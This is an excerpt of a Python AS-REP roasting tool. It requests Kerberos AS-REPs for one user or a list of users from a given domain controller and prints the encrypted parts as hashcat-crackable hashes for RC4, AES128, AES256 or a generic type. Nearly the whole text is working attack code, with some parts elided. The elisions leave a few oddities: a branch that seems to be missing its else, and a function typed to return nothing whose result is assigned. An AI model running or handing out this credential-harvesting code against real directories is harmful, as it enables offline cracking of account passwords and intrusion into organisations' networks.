...
def asrep_roast(user, domain, dc_ip) -> None:
    ...
    if asRep['enc-part']['etype'] == constants.EncryptionTypes.rc4_hmac.value:
        # RC4 format for hashcat mode 18200
        hashcat_format = '$krb5asrep$23$%s@%s:%s$%s' % (
            user, domain,
            hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(),
            hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode()
        )
    elif asRep['enc-part']['etype'] == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
        # AES256 format
        hashcat_format = '$krb5asrep$18$%s@%s:%s$%s' % (
            user, domain,
            hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(),
            hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode()
        )
    elif asRep['enc-part']['etype'] == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
        # AES128 format
        hashcat_format = '$krb5asrep$17$%s@%s:%s$%s' % (
            user, domain,
            hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(),
            hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode()
        )
        ...
        # Generic format
        hashcat_format = '$krb5asrep$%d$%s@%s:%s$%s' % (
            asRep['enc-part']['etype'], user, domain,
            hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(),
            hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode()
        )

    print(f"[+] AS-REP Hash: {hashcat_format}")

def main():
    parser = argparse.ArgumentParser(description='AS-REP Roast Users')
    parser.add_argument('-u', '--user', help='Username to roast')
    parser.add_argument('-ul', '--user-list', help='File containing a list of usernames to roast')
    ...
    if not args.domain or not args.dc_ip:
        parser.print_help()
        return
    ...
    if args.user_list:
        ...
        for user in users:
            print(f"[i] Roasting user: {user}")
            hash = asrep_roast(user, args.domain, args.dc_ip)
    elif args.user:
        print(f"[i] Roasting user: {args.user}")
        hash = asrep_roast(args.user, args.domain, args.dc_ip)
    else:
        print("[!] Please provide a user or a user list to roast.")
        parser.print_help()
        return
